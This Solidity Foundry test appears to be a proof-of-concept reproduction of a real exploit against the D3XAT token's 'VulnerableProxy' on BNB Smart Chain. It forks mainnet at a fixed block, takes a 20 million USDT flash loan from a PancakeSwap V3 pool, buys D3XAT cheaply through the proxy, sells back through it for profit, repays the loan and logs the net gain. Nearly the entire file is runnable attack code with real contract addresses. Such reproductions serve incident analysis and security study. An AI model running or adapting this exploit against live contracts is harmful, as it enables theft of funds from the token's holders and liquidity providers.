// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {IPancakeV3PoolActions} from "src/interface/IPancakeV3Pool.sol";
import {IPancakeRouter} from "src/interface/IPancakeRouter.sol";
import {PancakeSeller} from "src/PancakeSeller.sol";
import {ProxySeller} from "src/ProxySeller.sol";
import {ProxyBuyer} from "src/ProxyBuyer.sol";
import {ProxyBuyerHelper} from "src/ProxyBuyerHelper.sol";
import {PancakeBuyerHelper} from "src/PancakeBuyerHelper.sol";
import {PancakeBuyer} from "src/PancakeBuyer.sol";

contract d3xai is Test {
    uint256 blocknumToForkFrom = 57780985 - 1;

    uint256 numPancakeOperRound = 27;
    address[] public pancakeBuyers = new address[](numPancakeOperRound);
    address[] public pancakeSellers = new address[](numPancakeOperRound);

    uint256 numProxyOperRound = 2;
    address[] public proxyBuyers = new address[](numProxyOperRound);
    ProxySeller proxySeller;
    
    // Constants
    address constant PANCAKE_V3_POOL = 0x92b7807bF19b7DDdf89b706143896d05228f3121;
    address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant USDT_ADDR = 0x55d398326f99059fF775485246999027B3197955;
    address constant PROXY = 0xb8ad82c4771DAa852DdF00b70Ba4bE57D22eDD99;
    address constant D3XAT = 0x2Cc8B879E3663d8126fe15daDaaA6Ca8D964BbBE;
    
    address fundingToken;
    uint256 mainnet;

    // Track balances for profit calculation
    uint256 initialBalance;
    uint256 finalBalance;

    function setUp() public {
        console.log("=== D3XAI ATTACK SIMULATION ===");
        console.log("Setting up attack environment...");
        
        string memory url = vm.envString("BSC_RPC_URL");
        mainnet = vm.createFork(url, blocknumToForkFrom);
        vm.selectFork(mainnet);
        fundingToken = USDT_ADDR;
        
        console.log("Fork created at block:", blocknumToForkFrom);
        
        // Label important addresses
        vm.label(PANCAKE_V3_POOL, "PancakeV3Pool");
        vm.label(PANCAKE_ROUTER, "PancakeRouter");
        vm.label(USDT_ADDR, "USDT");
        vm.label(PROXY, "VulnerableProxy");
        vm.label(D3XAT, "D3XAT_Token");
        vm.label(address(this), "Attacker");
        
        console.log("Labeled key contracts:");
        console.log("- PancakeV3Pool:", PANCAKE_V3_POOL);
        console.log("- Vulnerable Proxy:", PROXY);
        console.log("- D3XAT Token:", D3XAT);

        // Deploy and label proxy buyer contracts
        console.log("\nDeploying proxy buyer contracts...");
        ProxyBuyerHelper proxyBuyerHelper = new ProxyBuyerHelper();
        vm.label(address(proxyBuyerHelper), "ProxyBuyerHelper");
        
        for (uint256 i = 0; i < proxyBuyers.length; i++) {
            ProxyBuyer buyer = new ProxyBuyer(address(proxyBuyerHelper));
            proxyBuyers[i] = address(buyer);
            vm.label(address(buyer), string(abi.encodePacked("ProxyBuyer_", vm.toString(i + 1))));
        }
        console.log("Deployed", proxyBuyers.length, "proxy buyer contracts");
        
        proxySeller = new ProxySeller();
        vm.label(address(proxySeller), "ProxySeller");

        // Deploy and label pancake buyer/seller contracts
        console.log("Deploying pancake buyer/seller contracts...");
        PancakeBuyerHelper pancakeBuyerHelper = new PancakeBuyerHelper();
        vm.label(address(pancakeBuyerHelper), "PancakeBuyerHelper");
        
        for (uint256 i = 0; i < pancakeBuyers.length; i++) {
            PancakeBuyer buyer = new PancakeBuyer(address(pancakeBuyerHelper));
            pancakeBuyers[i] = address(buyer);
            vm.label(address(buyer), string(abi.encodePacked("PancakeBuyer_", vm.toString(i + 1))));
        }
        
        for (uint256 i = 0; i < pancakeSellers.length; i++) {
            PancakeSeller seller = new PancakeSeller();
            pancakeSellers[i] = address(seller);
            vm.label(address(seller), string(abi.encodePacked("PancakeSeller_", vm.toString(i + 1))));
        }
        console.log("Deployed", pancakeBuyers.length, "pancake buyer contracts");
        console.log("Deployed", pancakeSellers.length, "pancake seller contracts");
        
        console.log("\n=== SETUP COMPLETE ===\n");
    }

    function testExploit() public {
        console.log(" STARTING EXPLOIT EXECUTION");
        console.log("==========================================");
        
        // Record initial balance
        IERC20 usdt = IERC20(USDT_ADDR);
        initialBalance = usdt.balanceOf(address(this));
        console.log("Initial USDT Balance:", initialBalance / 1e18, "USDT");
        
        // Step 1: Flash loan
        console.log("\n STEP 1: Initiating Flash Loan");
        console.log("----------------------------------");
        uint256 borrowAmount = 20_000_000 ether;
        console.log("Flash loan amount:", borrowAmount / 1e18, "USDT");
        console.log("Flash loan pool:", PANCAKE_V3_POOL);
        
        IPancakeV3PoolActions(PANCAKE_V3_POOL).flash(address(this), borrowAmount, 0, "");
        
        // Record final balance and calculate profit
        finalBalance = usdt.balanceOf(address(this));
        console.log("\n FINAL RESULTS");
        console.log("================");
        console.log("Final USDT Balance:", finalBalance / 1e18, "USDT");
        
        if (finalBalance > initialBalance) {
            console.log("PROFIT:", (finalBalance - initialBalance) / 1e18, "USDT");
        } else if (finalBalance < initialBalance) {
            console.log("LOSS:", (initialBalance - finalBalance) / 1e18, "USDT");
        } else {
            console.log("BREAK EVEN");
        }
    }

    function pancakeV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) public {
        console.log("\n FLASH LOAN CALLBACK EXECUTED");
        console.log("Fee0 (USDT):", fee0 / 1e18, "USDT");
        console.log("Fee1:", fee1);
        
        IERC20 usdt = IERC20(USDT_ADDR);
        IERC20 d3xat = IERC20(D3XAT);
        
        uint256 balanceAfterLoan = usdt.balanceOf(address(this));
        console.log("Balance after flash loan:", balanceAfterLoan / 1e18, "USDT");
    
        // Step 2: Buy D3XAT via proxy (cheap)
        console.log("\n STEP 2: Buying D3XAT via Vulnerable Proxy (Cheap)");
        console.log("-------------------------------------------------------");
        
        address[] memory USDT_D3XAT_PATH = new address[](2);
        USDT_D3XAT_PATH[0] = USDT_ADDR;
        USDT_D3XAT_PATH[1] = D3XAT;
        
        uint256 totalProxySpent = 0;
        uint256 totalProxyTokensBought = 0;
        
        for (uint256 i = 0; i < proxyBuyers.length; i++) {
            ProxyBuyer buyer = ProxyBuyer(proxyBuyers[i]);
            uint256 amountOut = 9000 ether; // Target D3XAT amount
            
            (uint256[] memory amounts) = IPancakeRouter(payable(PANCAKE_ROUTER)).getAmountsIn(amountOut, USDT_D3XAT_PATH);
            uint256 amountIn = amounts[0];
            
            console.log("ProxyBuyer %s - Spending: %s USDT for %s D3XAT", i + 1, amountIn / 1e18, amountOut / 1e18);
            
            usdt.approve(address(buyer), amountIn);
            buyer.buy(PROXY, USDT_ADDR, D3XAT, address(proxySeller), amountIn);
            
            totalProxySpent += amountIn;
            totalProxyTokensBought += amountOut;
        }
        
        console.log("Total proxy purchases - Spent: %s USDT", totalProxySpent / 1e18);
        console.log("Expected D3XAT bought: %s D3XAT", totalProxyTokensBought / 1e18);
        console.log("Actual D3XAT in proxySeller: %s D3XAT", d3xat.balanceOf(address(proxySeller)) / 1e18);

        // Step 3: Buy D3XAT from PancakeSwap (market price)
        console.log("\n STEP 3: Buying D3XAT from PancakeSwap (Market Price)");
        console.log("--------------------------------------------------------");
        
        uint256 totalPancakeSpent = 0;
        uint256 totalPancakeTokensBought = 0;
        
        for (uint256 i = 0; i < pancakeBuyers.length; i++) {
            PancakeBuyer buyer = PancakeBuyer(pancakeBuyers[i]);
            uint256 amountOut = 9900 ether; // Target D3XAT amount
            
            (uint256[] memory amounts) = IPancakeRouter(payable(PANCAKE_ROUTER)).getAmountsIn(amountOut, USDT_D3XAT_PATH);
            uint256 amountIn = amounts[0];
            
            if (i < 3 || i % 5 == 0) { // Log every 5th transaction + first 3
                console.log("PancakeBuyer %s - Spending: %s USDT", i + 1, amountIn / 1e18);
            }
            
            usdt.approve(address(buyer), amountIn);
            buyer.buy(USDT_ADDR, D3XAT, pancakeSellers[i], amountIn);
            
            totalPancakeSpent += amountIn;
            totalPancakeTokensBought += amountOut;
        }
        
        console.log("Total pancake purchases - Spent: %s USDT", totalPancakeSpent / 1e18);
        console.log("Expected D3XAT distributed to sellers: %s D3XAT", totalPancakeTokensBought / 1e18);
        
        uint256 balanceAfterBuying = usdt.balanceOf(address(this));
        console.log("USDT balance after buying: %s USDT", balanceAfterBuying / 1e18);

        // Step 4: Sell D3XAT via proxy (profitable)
        console.log("\n STEP 4: Selling D3XAT via Vulnerable Proxy (Profitable)");
        console.log("------------------------------------------------------------");
        
        uint256 balanceBeforeProxySell = usdt.balanceOf(address(this));
        uint256 d3xatBeforeProxySell = d3xat.balanceOf(address(proxySeller));
        console.log("D3XAT available for proxy selling: %s D3XAT", d3xatBeforeProxySell / 1e18);
        
        uint256 successfulProxySells = 0;
        for (uint256 i = 0; i < 30; i++) {
            uint256 amount = 29740606898687781957; // Specific amount from original
            
            try proxySeller.sell(PROXY, D3XAT, USDT_ADDR, amount, address(this)) {
                successfulProxySells++;
                if (i < 5 || i % 10 == 0) { // Log first 5 and every 10th
                    console.log("Proxy sell %s successful - Amount: %s D3XAT", i + 1, amount / 1e18);
                }
            } catch {
                console.log("Proxy selling stopped at attempt: %s", i + 1);
                break;
            }
        }
        
        uint256 balanceAfterProxySell = usdt.balanceOf(address(this));
        uint256 proxySellProfit = balanceAfterProxySell - balanceBeforeProxySell;
        console.log("Successful proxy sells: %s", successfulProxySells);
        console.log("Profit from proxy selling: %s USDT", proxySellProfit / 1e18);

        // Step 5: Sell remaining D3XAT to PancakeSwap
        console.log("\n STEP 5: Selling D3XAT to PancakeSwap (Recovery)");
        console.log("---------------------------------------------------");
        
        uint256 balanceBeforePancakeSell = usdt.balanceOf(address(this));
        uint256 sellersWithTokens = 0;
        uint256 totalTokensSold = 0;
        
        for (uint256 i = 0; i < pancakeSellers.length; i++) {
            PancakeSeller seller = PancakeSeller(pancakeSellers[i]);
            uint256 sellerBalance = d3xat.balanceOf(address(seller));
            
            if (sellerBalance > 0) {
                sellersWithTokens++;
                totalTokensSold += sellerBalance;
                
                if (sellersWithTokens <= 3 || sellersWithTokens % 5 == 0) {
                    console.log("Seller %s selling: %s D3XAT", i + 1, sellerBalance / 1e18);
                }
                
                seller.sell(USDT_ADDR, D3XAT, address(this));
            }
        }
        
        uint256 balanceAfterPancakeSell = usdt.balanceOf(address(this));
        uint256 pancakeSellRecovery = balanceAfterPancakeSell - balanceBeforePancakeSell;
        console.log("Sellers with tokens: %s", sellersWithTokens);
        console.log("Total D3XAT sold: %s D3XAT", totalTokensSold / 1e18);
        console.log("USDT recovered from pancake selling: %s USDT", pancakeSellRecovery / 1e18);

        // Step 6: Repay flash loan
        console.log("\n STEP 6: Repaying Flash Loan");
        console.log("-------------------------------");
        
        uint256 repayAmount = 20_000_000 ether + fee0;
        uint256 balanceBeforeRepay = usdt.balanceOf(address(this));
        
        console.log("Amount to repay: %s USDT", repayAmount / 1e18);
        console.log("Balance before repay: %s USDT", balanceBeforeRepay / 1e18);
        
        if (balanceBeforeRepay >= repayAmount) {
            console.log(" Sufficient balance to repay loan");
        } else {
            console.log(" Insufficient balance! Missing:", (repayAmount - balanceBeforeRepay) / 1e18, "USDT");
        }
        
        IERC20(USDT_ADDR).transfer(PANCAKE_V3_POOL, repayAmount);
        
        uint256 balanceAfterRepay = usdt.balanceOf(address(this));
        console.log("Balance after repay:", balanceAfterRepay / 1e18, "USDT");
        
        console.log(" ATTACK SUMMARY");
        console.log("=================");
        console.log("1. Flash loan:", 20_000_000, "USDT");
        console.log("2. Proxy purchases:", totalProxySpent / 1e18, "USDT");
        console.log("3. Pancake purchases:", totalPancakeSpent / 1e18, "USDT");
        console.log("4. Proxy sell profit:", proxySellProfit / 1e18, "USDT");
        console.log("5. Pancake sell recovery:", pancakeSellRecovery / 1e18, "USDT");
        console.log("6. Flash loan fee:", fee0 / 1e18, "USDT");
        
        int256 netProfit = int256(balanceAfterRepay) - int256(initialBalance);
        if (netProfit > 0) {
            console.log(" Net profit:", uint256(netProfit) / 1e18, "USDT");
        } else {
            console.log(" Net loss:", uint256(-netProfit) / 1e18, "USDT");
        }
    }
}